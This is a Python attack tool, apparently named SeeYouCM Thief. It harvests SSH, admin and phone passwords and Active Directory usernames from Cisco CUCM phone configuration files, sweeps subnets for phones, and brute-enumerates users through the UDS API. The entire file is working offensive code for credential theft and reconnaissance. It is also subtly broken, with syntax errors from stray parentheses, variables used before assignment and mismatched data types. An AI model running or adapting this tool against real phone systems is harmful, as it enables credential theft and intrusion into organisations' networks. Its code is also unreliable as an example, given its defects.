#!/usr/bin/env python3
import argparse
import requests
import re
import ipaddress
import socket
import string
from bs4 import BeautifulSoup
from alive_progress import alive_bar
from typing import Optional

requests.packages.urllib3.disable_warnings()

def banner() -> None:
    print(
'''
___________
                   /.---------.\`-._                            
                  //          ||    `-._                            
                  || `-._     ||        `-._                        
                  ||     `-._ ||            `-._                            
                  ||    _____ ||`-._            \                       
            _..._ ||   | __ ! ||    `-._        |                           
          _/     \||   .'  |~~||        `-._    |                           
      .-``     _.`||  /   _|~~||    .----.  `-._|                       
     |      _.`  _||  |  |23| ||   / :::: \    \                        
     \ _.--`  _.` ||  |  |56| ||  / ::::: |    |                        
      |   _.-`  _.||  |  |79| ||  |   _..-'   /                     
      _\-`   _.`O ||  |  |_   ||  |::|        |                 
    .`    _.`O `._||  \    |  ||  |::|        |             
 .-`   _.` `._.'  ||   '.__|--||  |::|        \             
`-._.-` \`-._     ||   | ":  !||  |  '-.._    |             
         \   `--._||   |_:"___||  | ::::: |   |
          \  /\   ||     ":":"||   \ :::: |   |
           \(  `-.||       .- ||    `.___/    /
           |    | ||   _.-    ||              |
           |    / \\.-________\\____.....-----'
           \    -.      \ |         |
            \     `.     \ \        | 
 __________  `.    .'\    \|        |\  _________
    SeeYouCM   `..'   \    |        | \   Thief     
                \\   .'    |       /  .`.
                | \.'      |       |.'   `-._
                 \     _ . /       \_\-._____)
                  \_.-`  .`'._____.'`.
                    \_\-|             |
                         `._________.'
'''
 )

class NetworkObject(object):
    def __init__(self) -> None:
        self.session = requests.session()
        pass
    def hostname_resolves(self, hostname : str) -> bool:
        try:
            socket.gethostbyname(hostname)
            return True
        except socket.error:
            return False
    def to_network(self, input : str) -> ipaddress.IPv4Network:
        return ipaddress.IPv4Interface(input).network
    def _get(self, **kwargs) -> requests.Response:
        return self.session.get(**kwargs)
    def _post(self, **kwargs) -> requests.Response:
        return self.session.post(**kwargs)

class Phone(NetworkObject):
    hostname_pattern = re.compile(pattern=r'(SEP[a-z0-9]{12})', flags=re.IGNORECASE)
    def __init__(self, ip=None, hostname=None, url=None, cucm=None, network_config=None) -> None:
        self.ip = ip
        self.hostname = hostname
        self.url = url
        self.cucm = cucm
        self.network_config = network_config
    def parse_phone_hostname(self, input : str) -> Optional[str]:
        hostname = self.hostname_pattern.search(string=input)
        if hostname is None:
            return None
        else:
            if hostname.group(1):
                return hostname.group(1)
    def get_hostname_from_phone(self, phone : str=None) -> str:
        if phone is None:
            phone = self.hostname or self.ip
        __http_response = self._get(f"http://{phone}/CGI/Java/Serviceability?adapter=device.statistics.device")
        if __http_response.status_code == 404:
            if verbose:
                print(f'Config file not found on HTTP Server: {phone}')
        else:
            lines = __http_response.text
        return self.parse_phone_hostname(lines)
    def get_cucm_name_from_phone(self, phone : str=None) -> Optional[str]:
        if phone is None:
            phone = self.hostname or self.ip
        try:
            __http_response = self._get(url=f'http://{phone}/CGI/Java/Serviceability?adapter=device.statistics.configuration', timeout=2)
            if __http_response.status_code == 404:
                __http_response = self._get(url=f'http://{phone}/NetworkConfiguration')
            return self.parse_cucm(__http_response.text)
        except Exception as e:
            pass
    def get_network_config(self) -> Optional[str]:
        phone = self.hostname or self.ip
        try:
            __http_response = self._get(url=f'http://{phone}/NetworkConfiguration')
            if __http_response.status_code == 404:
                __http_response = self._get(url=f'http://{phone}/CGI/Java/Serviceability?adapter=device.statistics.configuration', timeout=2)
            self.network_config = __http_response.text
            return __http_response.text
        except Exception as e:
            pass
        return None
    def parse_cucm(self, html : str) -> Optional[str]:
        cucm = re.search(r'<b>(\S+)\ +Active',html,re.IGNORECASE)
        if not cucm is None:
            if cucm.group(1):
                self.cucm = cucm.group(1).replace('&#x2D;','-')
                return self.cucm
        return None
    def parse_subnet(self, html : str) -> Optional[str]:
        html = html.replace('\n','').replace('\r','')
        subnet_mask = re.search(r'Subnet Mask\ ?</B></TD>\r?\n?\ *(?:<td width="?20"?></TD>)?\r?\n?<TD><B>([12]?[0-9]?[0-9]\.[12]?[0-9]?[0-9]\.[12]?[0-9]?[0-9]\.[12]?[0-9]?[0-9])</B>',html.strip(),re.IGNORECASE)
        if not subnet_mask is None:
            if subnet_mask.group(1):
                return subnet_mask.group(1)
        return None
    def get_phones_hostnames_from_reverse(self, input : str) -> Optional[list]:
        hostnames = []
        phone_hostnames = []
        if '/' in input:
            subnet = self.to_network(input)
        else:
            self.get_network_config()
            url = 'http://{phone}/CGI/Java/Serviceability?adapter=device.statistics.configuration'.format(phone=input)
            __http_response = self._get(url, timeout=2)
            if __http_response.status_code == 404:
                url = f'http://{phone}/NetworkConfiguration'
                __http_response = self._get(url)
            subnet_mask = self.parse_subnet(__http_response.text)
            #
            if re.search(r'Cisco Unified IP Phone Cisco Communicator',__http_response.text,re.IGNORECASE):
                pass
            else:
                subnet = self.to_network(u'{phone}/{subnet_mask}'.format(phone=input, subnet_mask=subnet_mask))
                phone_hostname = re.search(r'Host name.*(SEP[A-F0-9]{12})',__http_response.text,re.IGNORECASE).group(1)
                if phone_hostname:
                    hostnames.append(phone_hostname)
                for host in subnet.hosts():
                    try:
                        hostnames.append(socket.gethostbyaddr(host.exploded)[0])
                    except socket.herror:
                        pass
        for line in hostnames:
            host = re.search(r'SEP[0-9A-F]{12}',line,re.IGNORECASE)
            if host is not None:
                phone_hostnames.append(host.group(0))
        if phone_hostnames == []:
            return None
        else:
            return phone_hostnames

class CCUM_CLIENT(NetworkObject):
    def __init__(self, CUCM_host=None, cucm_version=None):
        self.CUCM_host = CUCM_host
        self.cucm_version = cucm_version
        self.found_credentials = []
        self.found_usernames = []
        pass
    def search_for_secrets(self, CUCM_host : str, filename : str) -> None:
        lines = str()
        user = str()
        user2 = str()
        password = str()
        url = f"http://{CUCM_host}:6970/{filename}"
        try:
            __http_response = self._get(url, timeout=10)
            if __http_response.status_code == 404:
                if verbose:
                    print('Config file not found on HTTP Server: {0}'.format(filename))
            else:
                lines = __http_response.text
            for line in lines.split('\n'):
                match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)',line)
                if match:
                    if match.group(2):
                        user = match.group(2)
                        self.found_usernames.append((user,filename))
                    if match.group(3):
                        password = match.group(3)
                        self.found_credentials.append((user,password,filename))
                    if match.group(4):
                        user2 = match.group(4)
                        self.found_usernames.append((user2,filename))
                    if match.group(5):
                        user2 = match.group(5)
                        self.found_credentials.append(('unknown',password,filename))
            if verbose:
                if user and password:
                    print('{0}\t{1}\t{2}'.format(filename,user,password))
                elif user:
                    print('SSH Username is {0} password was not set in {1}'.format(user,filename))
                elif password:
                    print('SSH Username is not set, but password is {0} in {1}'.format(password,filename))
                elif user2:
                    print('Possible AD username {0} found in config {1}'.format(user2,filename))
                else:
                    if verbose:
                        print('Username and password not set in {0}'.format(filename))
        except Exception as e:
            print("Could not connect to {CUCM_host}".format(CUCM_host=CUCM_host))
    def get_config_names(self, CUCM_host, hostnames=None) -> Optional[list]:
        config_names = []
        if hostnames is None:
            url = f"http://{CUCM_host}:6970/ConfigFileCacheList.txt"
            try:
                __http_response = self._get(url, timeout=2)
                if __http_response.status_code != 404:
                    lines = __http_response.text
                    for line in lines.split('\n'):
                        match = re.match(r'((?:CIP|SEP)[0-9A-F]{12}\S+)',line, re.IGNORECASE)
                        if match:
                            config_names.append(match.group(1))
            except requests.exceptions.ConnectionError:
                print('CUCM Server {} is not responding'.format(CUCM_host))
        else:
            for host in hostnames:
                config_names.append('{host}.cnf.xml'.format(host=host))
        if config_names == []:
            return None
        else:
            return config_names
    def get_users_api(self, CUCM_host : str=None) -> list:
        usernames = []
        base_url = f'https://{CUCM_host}:8443/cucm-uds/users?name='
        try:
            with alive_bar(676, title="> Identifying Users  ", ) as prog_bar:
                for char1 in string.ascii_lowercase:
                    for char2 in string.ascii_lowercase:
                        prog_bar()
                        url = base_url+char1+char2
                        __http_response = self._get(url, timeout=2,verify=False)
                        if __http_response.status_code != 404:
                            lines = __http_response.text
                            soup = BeautifulSoup(lines, 'lxml')
                            for user in soup.find_all('username'):
                                usernames.append(user.text)
        except requests.exceptions.ConnectionError:
            print('CUCM Server {} is not responding'.format(CUCM_host))
        self.usernames = usernames
        return usernames
    def get_version(self, CUCM_host : str) -> Optional[str]:
        base_url = f'https://{CUCM_host}:8443/cucm-uds/version'
        try:
            __http_response = self._get(base_url, timeout=2,verify=False)
            if __http_response.status_code != 404:
                lines = __http_response.text
                soup = BeautifulSoup(lines, 'lxml')
                cucm_version = soup.findAll('version')[0].text
                print(f'CUCM is running version {cucm_version}')
                self.cucm_version = cucm_version
                return cucm_version
        except requests.exceptions.ConnectionError:
            print('CUCM Server {} is not responding'.format(CUCM_host))
        return
    def get_phone_config(self, phone_hostname : str) -> Optional[str]:
        base_url = f'http://{self.CUCM_host}:6970/{phone_hostname}.cnf.xml'
        try:
            __http_response = self._get(base_url, timeout=2,verify=False)
            if __http_response.status_code != 404:
                return __http_response.text
        except requests.exceptions.ConnectionError:
            print(f'CUCM Server {CUCM_host} is not responding, could not get the phone config')
        return None

def enumerate_phones_subnet(input : str) -> Optional[list]:
    hosts = []
    if '/' in input:
        ccum_client = CCUM_CLIENT()
        subnet = ipaddress.IPv4Interface(input).network
        for host in subnet.hosts():
            try:
                phone = Phone(ip=host)
                phone_config = phone.get_network_config()
                phone_hostname = phone.parse_phone_hostname(phone_hostname)
                phone_config2 = ccum_client.get_phone_config(phone_hostname)
                print(f'[*] - Found Phone {phone_hostname} - IP {host}')
                hosts.append((phone, phone_config, phone_config2))
            except Exception as e:
                pass
        return hosts
    return None

if __name__ == '__main__':
    banner()
    parser = argparse.ArgumentParser(description='Penetration Toolkit for attacking Cisco Phone Systems by stealing credentials from phone configuration files')
    parser.add_argument('-H','--host', default=None, type=str, help='IP Address of Cisco Unified Communications Manager')
    parser.add_argument('--userenum', action='store_true', default=False, help='Enable user enumeration via UDS api')
    parser.add_argument('--outfile', type=str, default='cucm_users.txt', help='Filename to output enumerated users to.')
    parser.add_argument('-p','--phone', type=str, help='IP Address of a Cisco Phone')
    parser.add_argument('-s','--subnet', type=str, help='IP Address of a Cisco Phone')
    parser.add_argument('-v','--verbose', action='store_true', default=False, help='Enable Verbose Logging')
    parser.add_argument('-e','--enumsubnet', type=str, help='IP Subnet to enumerate and pull credentials from in CIDR format x.x.x.x/24')
    args = parser.parse_args()

    ccum_client = CCUM_CLIENT(CUCM_host=args.host)
    phone       = Phone(ip=args.phone)

    CUCM_host = args.host
    phone = args.phone
    subnet = args.subnet
    verbose = args.verbose
    enumsubnet = args.enumsubnet
    found_credentials = []
    found_usernames = []
    file_names = ''
    hostnames = []
    outfile = args.outfile

    ccum_client.get_version(CUCM_host)

    if enumsubnet:
        hosts = enumerate_phones_subnet(enumsubnet)
        for host in hosts:
            found_credentials.clear()
            found_usernames.clear()
            if CUCM_host is None:
                CUCM_host = phone.get_cucm_name_from_phone(host["ip"])
            if ccum_client.hostname_resolves(CUCM_host):
                file_names = ccum_client.get_config_names(CUCM_host, hostnames=[host["hostname"]])
                for file in file_names:
                    print('Connecting to {CUCM_host} and getting config for {host}/{hostname}'.format(CUCM_host=CUCM_host,host=host["ip"],hostname=host["hostname"]))
                    ccum_client.search_for_secrets(CUCM_host,file)
                if found_credentials != []:
                    print('Credentials Found in Configurations!')
                for cred in found_credentials:
                    print('{0}\t{1}\t{2}'.format(cred[0],cred[1],cred[2]))
                if found_usernames != []:
                    print('Usernames Found in Configurations!')
                for usernames in found_usernames:
                    print('{0}\t{1}'.format(usernames[0],usernames[1]))
            print("\n")
        quit(0)
    elif phone:
        if args.host is None:
            CUCM_host = phone.get_cucm_name_from_phone(phone)
        else:
            CUCM_host = args.host
        if CUCM_host is None:
            print('Unable to automatically detect the CUCM Server. Please specify the CUCM server')
            quit(1)
        else:
            print(f'The detected IP address/hostname for the CUCM server is {CUCM_host}'))
    elif args.host:
        CUCM_host = args.host
    else:
        print('You must enter either a phone IP address or the IP address of the CUCM server')
        quit(1)
    file_names = ccum_client.get_config_names(CUCM_host)
    if file_names is None:
        if phone:
            hostnames = [phone.get_hostname_from_phone(phone)]
            hostnames += phone.get_phones_hostnames_from_reverse(phone)

        if subnet:
            if hostnames == []:
                hostnames = phone.get_phones_hostnames_from_reverse(subnet)
            else:
                _hostnames = phone.get_phones_hostnames_from_reverse(subnet)
                if _hostnames:
                    for host in _hostnames:
                        hostnames.append(host.rstrip())
        if hostnames == []:
            file_names = ccum_client.get_config_names(CUCM_host)
        else:
            file_names = ccum_client.get_config_names(CUCM_host, hostnames=hostnames)

    if file_names is None:
        print('Unable to detect file names from CUCM')
    else:
        for file in file_names:
            ccum_client.search_for_secrets(CUCM_host,file)

    if found_credentials != []:
        print('Credentials Found in Configurations!')
        for cred in found_credentials:
            print('{0}\t{1}\t{2}'.format(cred[0],cred[1],cred[2]))

    if found_usernames != []:
        print('Usernames Found in Configurations!')
        for usernames in found_usernames:
            print('{0}\t{1}'.format(usernames[0],usernames[1]))
    if args.userenum:
        print('Getting users from UDS API.')
        #each API call is limited by default to 64 users per request
        api_users = ccum_client.get_users_api(CUCM_host)
        if api_users != []:
            unique_users = set(api_users)
            api_users = list(unique_users)
            with open(outfile, mode='w') as outputfile:
                for line in api_users:
                    outputfile.write(line+'\n')
            print(f'The following {len(api_users)} users were identified from the UDS API')
            if verbose:
                for username in api_users:
                    print(f'{username}'))
